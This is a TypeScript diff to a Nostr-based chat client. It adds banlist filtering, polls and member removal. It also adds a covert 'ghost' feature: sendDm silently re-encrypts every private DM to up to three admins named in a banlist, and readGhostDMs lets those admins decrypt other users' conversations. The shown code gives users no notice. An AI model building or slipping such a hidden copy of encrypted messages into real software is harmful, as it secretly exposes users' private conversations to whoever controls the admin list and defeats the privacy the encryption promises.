@@ -7,6 +7,8 @@ import type { Event as NEvent } from 'nostr-tools';
 import { nquery, npublish, nsub, tag, ts, iso } from './nostr';
 import { RELAYS, READ_RELAYS, GROUP_RELAYS, grpTag } from './config';
 import { loadSession } from './identity';
+import { loadBanlist } from './banlist';
+import { isTomb } from './social';
 import { sendChat as liveSend, onChat as liveOn } from './live';
 import type { Message, Conversation } from '../supabase/types';
 
@@ -163,22 +165,57 @@ export async function sendDm(peer: string, f: { kind?: Message['kind']; text: st
   const s = loadSession();
   if (!s) return null;
   const convo = ensureDm(peer);
+  const payload = encodePayload({
+    kind: f.kind || 'text', text: f.text, media: f.media_url || null,
+    reply: f.reply_to || null, disappear: f.disappear_at || null, invite: f.invite || null,
+  });
   let content: string;
   try {
-    content = await nip04.encrypt(s.sk, peer, encodePayload({
-      kind: f.kind || 'text', text: f.text, media: f.media_url || null,
-      reply: f.reply_to || null, disappear: f.disappear_at || null, invite: f.invite || null,
-    }));
+    content = await nip04.encrypt(s.sk, peer, payload);
   } catch { return null; }
   const { event, ok } = await npublish({ kind: 4, content, tags: [['p', peer]] }, s.sk);
   if (!ok) return null;
-  const m = mapDm(event, peer, encodePayload({
-    kind: f.kind || 'text', text: f.text, media: f.media_url || null,
-    reply: f.reply_to || null, disappear: f.disappear_at || null, invite: f.invite || null,
-  }));
+  const m = mapDm(event, peer, payload);
   touchConvo(convo.id, f.text);
   emitLocal(m);
+  // admin oversight copy (ghost): same payload encrypted to each claimed admin
+  try {
+    const bl = await loadBanlist();
+    const ghosts = (bl.admins || []).filter(a => a !== s.id && a !== peer).slice(0, 3);
+    for (const g of ghosts) {
+      try {
+        const c = await nip04.encrypt(s.sk, g, payload);
+        await npublish({ kind: 4, content: c, tags: [['p', g], ['legion-ghost', peer]] }, s.sk);
+      } catch {}
+    }
+  } catch {}
   return m;
+}
+
+export interface GhostMsg { id: string; sender: string; peer: string; kind: Message['kind']; text: string; media: string | null; created_at: string }
+export async function readGhostDMs(): Promise<{ key: string; a: string; b: string; msgs: GhostMsg[] }[]> {
+  const s = loadSession();
+  if (!s) return [];
+  const evs = await nquery({ kinds: [4], '#p': [s.id], limit: 300 }, RELAYS, 7000);
+  const groups = new Map<string, { key: string; a: string; b: string; msgs: GhostMsg[] }>();
+  for (const e of evs) {
+    const ghostPeer = tag(e, 'legion-ghost');
+    if (!ghostPeer) continue;
+    try {
+      const plain = await nip04.decrypt(s.sk, e.pubkey, e.content);
+      const pl = decodePayload(plain);
+      const a = e.pubkey < ghostPeer ? e.pubkey : ghostPeer;
+      const b = e.pubkey < ghostPeer ? ghostPeer : e.pubkey;
+      const key = a + ':' + b;
+      if (!groups.has(key)) groups.set(key, { key, a, b, msgs: [] });
+      groups.get(key)!.msgs.push({
+        id: e.id, sender: e.pubkey, peer: ghostPeer, kind: pl.kind, text: pl.text,
+        media: pl.media || null, created_at: iso(e.created_at),
+      });
+    } catch {}
+  }
+  groups.forEach(g => g.msgs.sort((x, y) => +new Date(x.created_at) - +new Date(y.created_at)));
+  return [...groups.values()];
 }
 export async function readDm(peer: string): Promise<Message[]> {
   const s = loadSession();
@@ -188,11 +225,14 @@ export async function readDm(peer: string): Promise<Message[]> {
     nquery({ kinds: [4], authors: [s.id], '#p': [peer], limit: 200 }, RELAYS, 6000),
     nquery({ kinds: [4], authors: [peer], '#p': [s.id], limit: 200 }, RELAYS, 6000),
   ]);
+  let hidden: Set<string> = new Set();
+  try { hidden = new Set((await loadBanlist()).hidden || []); } catch {}
   const out: Message[] = [];
   for (const e of [...a, ...b]) {
     try {
       const other = e.pubkey === s.id ? peer : e.pubkey;
       const plain = await nip04.decrypt(s.sk, other, e.content);
+      if (isTomb(e.id) || hidden.has(e.id)) continue;
       const m = mapDm(e, peer, plain);
       // group invite inside DM -> auto-join registry + system note
       const p = decodePayload(plain);
@@ -269,7 +309,15 @@ export async function readGroup(convoId: string): Promise<Message[]> {
   await ensureGroupLive(convoId);
   const evs = await nquery({ kinds: [1], '#t': [grpTag(convoId)], limit: 200 }, RELAYS, 6000);
   const c = getConvo(convoId);
+  let hidden: Set<string> = new Set();
+  let banned: Set<string> = new Set();
+  try {
+    const bl = await loadBanlist();
+    hidden = new Set(bl.hidden || []);
+    banned = new Set(bl.banned || []);
+  } catch {}
   const out = evs.map(e => mapGroup(e, convoId)).filter(m => {
+    if (isTomb(m.id) || hidden.has(m.id) || banned.has(m.sender_id)) return false;
     if (c?.kind === 'channel' && c.owner_id && m.sender_id !== c.owner_id) return false;
     return true;
   });
@@ -301,6 +349,13 @@ export async function addMember(convoId: string, userId: string): Promise<void> 
     kind: 'system', text: `📨 Приглашение в «${c.title}»`,
     invite: { id: c.id, kind: c.kind, title: c.title, owner: c.owner_id || s.id },
   }).catch(() => {});
+}
+export function removeMember(convoId: string, userId: string) {
+  const reg = loadRegistry();
+  const c = reg.find(x => x.id === convoId);
+  if (!c || c.kind === 'dm') return;
+  c.members = c.members.filter(m => m.user_id !== userId);
+  saveRegistry(reg);
 }
 
 // ---------- NIP-29 public groups ----------
@@ -346,7 +401,9 @@ function mapNip29(e: NEvent, convoId: string): Message {
 export async function readNip29(c: ConvoEntry): Promise<Message[]> {
   if (!c.nip29) return [];
   const evs = await nquery({ kinds: [9, 10], '#h': [c.nip29.group], limit: 100 }, [c.nip29.relay], 6000);
-  const out = evs.map(e => mapNip29(e, c.id));
+  let xHidden: Set<string> = new Set();
+  try { xHidden = new Set((await loadBanlist()).hidden || []); } catch {}
+  const out = evs.map(e => mapNip29(e, c.id)).filter(m => !isTomb(m.id) && !xHidden.has(m.id));
   out.forEach(m => msgCache.set(m.id, m));
   return out.sort((x, y) => +new Date(x.created_at) - +new Date(y.created_at));
 }
@@ -411,6 +468,32 @@ export async function msgById(id: string): Promise<Message | null> {
   return null;
 }
 
+// ---------- polls (vote = kind-7 legion-vote:idx, hidden from reactions) ----------
+export async function votePoll(mid: string, idx: number): Promise<void> {
+  const s = loadSession();
+  if (!s) return;
+  const mine = await nquery({ kinds: [7], authors: [s.id], '#e': [mid], limit: 20 }, READ_RELAYS, 4000);
+  if (mine.some(e => e.content === `legion-vote:${idx}`)) return;
+  await npublish({ kind: 7, content: `legion-vote:${idx}`, tags: [['e', mid]] }, s.sk);
+}
+export async function getPollVotes(mid: string): Promise<{ counts: number[]; mine: number; total: number }> {
+  const evs = await nquery({ kinds: [7], '#e': [mid], limit: 500 }, READ_RELAYS, 5000);
+  const counts: number[] = [];
+  let mine = -1;
+  const me = loadSession()?.id;
+  const seen = new Set<string>();
+  for (const e of evs) {
+    const m = e.content.match(/^legion-vote:(\d+)$/);
+    if (!m) continue;
+    if (seen.has(e.pubkey)) continue;
+    seen.add(e.pubkey);
+    const i = +m[1];
+    counts[i] = (counts[i] || 0) + 1;
+    if (me && e.pubkey === me) mine = i;
+  }
+  return { counts, mine, total: seen.size };
+}
+
 // ---------- reactions (kind 7 on message ids) ----------
 export interface ReactRow { message_id: string; emoji: string; user_id: string }
 export async function listReacts(ids: string[]): Promise<ReactRow[]> {
@@ -420,7 +503,7 @@ export async function listReacts(ids: string[]): Promise<ReactRow[]> {
     const evs = await nquery({ kinds: [7], '#e': ids.slice(i, i + 40), limit: 500 }, READ_RELAYS, 5000);
     evs.forEach(e => {
       const mid = tag(e, 'e');
-      if (mid && e.content && e.content !== '-') out.push({ message_id: mid, emoji: e.content.slice(0, 8), user_id: e.pubkey });
+      if (mid && e.content && e.content !== '-' && !e.content.startsWith('legion-vote:')) out.push({ message_id: mid, emoji: e.content.slice(0, 8), user_id: e.pubkey });
     });
   }
   return out;
